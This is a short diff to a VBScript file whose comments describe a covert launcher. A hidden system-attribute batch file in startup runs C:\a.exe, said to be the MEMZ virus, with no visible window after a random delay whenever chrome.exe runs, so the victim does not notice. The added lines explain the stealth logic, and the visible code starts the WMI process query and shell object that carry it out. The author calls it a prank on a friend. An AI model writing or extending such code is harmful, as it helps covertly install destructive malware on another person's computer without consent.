@@ -4,7 +4,10 @@
 'bumbum.bat hides this file to startup. why .bat? because its easy to hide .bat files inside executables.
 'added this ntfs tags +h for hidden +s for hidden even if user can see hidden files
 'it cant see +s files because they are system files.
-'I started this this will start C:\a.exe without a window what does a.exe contain? memz virus! it was best joke i ever did to my friend!
+'when it detects a process named "chrome.exe" it'll select random number between 269 and 69 transform that numberto seconds
+'and start C\a.exe without a window! this part is impurtunt whuy?? because if we just start cmd window will appear for a seconds and then disappear
+'and user will know something bad happened.
+'what does a.exe contain? memz virus! it was best joke i ever did to my friend!
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'chrome.exe'")
 Set objShell = CreateObject("WScript.Shell")
